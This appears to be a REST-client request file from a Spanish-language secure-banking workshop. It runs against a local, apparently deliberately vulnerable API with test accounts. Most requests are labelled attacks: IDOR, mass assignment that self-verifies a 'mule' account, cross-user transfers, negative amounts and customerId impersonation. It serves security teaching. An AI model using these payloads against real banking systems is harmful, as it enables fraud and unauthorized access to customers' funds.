### Taller Banca Segura IA — requests de exploración (IntelliJ HTTP Client / VS Code REST Client)
### Usuarios de PRUEBA: ana / ana123  ·  bruno / bruno123

@base = http://localhost:8080

### 1. Listar mis beneficiarios (ana)
GET {{base}}/api/beneficiaries
Authorization: Basic ana ana123

### 2. Ver uno de mis beneficiarios por id (ana -> 90)
GET {{base}}/api/beneficiaries/90
Authorization: Basic ana ana123

### 3. ATAQUE IDOR: 90 -> 91 (beneficiario de bruno)
GET {{base}}/api/beneficiaries/91
Authorization: Basic ana ana123

### 4. ATAQUE Mass Assignment (CWE-915): me asigno estado VERIFIED y riesgo 0
POST {{base}}/api/beneficiaries
Authorization: Basic ana ana123
Content-Type: application/json

{
  "alias": "Cuenta mula",
  "holderName": "Tercero",
  "holderRut": "77777777-7",
  "bankCode": "016",
  "accountNumber": "000999888777",
  "status": "VERIFIED",
  "internalRiskScore": 0
}

### 5. ATAQUE Tampering: transfiero a un beneficiario de bruno (UUID "imposible de adivinar")
POST {{base}}/api/transfers
Authorization: Basic ana ana123
Content-Type: application/json

{
  "beneficiaryId": "7b2e9d14-6a3c-4f8e-b1d5-2c9a8e4f9102",
  "amount": 10000,
  "currency": "CLP"
}

### 6. ATAQUE monto negativo
POST {{base}}/api/transfers
Authorization: Basic ana ana123
Content-Type: application/json

{
  "beneficiaryId": "3f6c1a52-8d4e-4b1a-9c2f-5a7e1d0b9001",
  "amount": -50000,
  "currency": "CLP"
}

### 7. ATAQUE suplantación por parámetro: customerId de bruno
POST {{base}}/api/transfers
Authorization: Basic ana ana123
Content-Type: application/json

{
  "customerId": 2,
  "beneficiaryId": "3f6c1a52-8d4e-4b1a-9c2f-5a7e1d0b9001",
  "amount": 1000,
  "currency": "CLP"
}

### 8. Error verboso: id inexistente / JSON roto
GET {{base}}/api/beneficiaries/9999
Authorization: Basic ana ana123
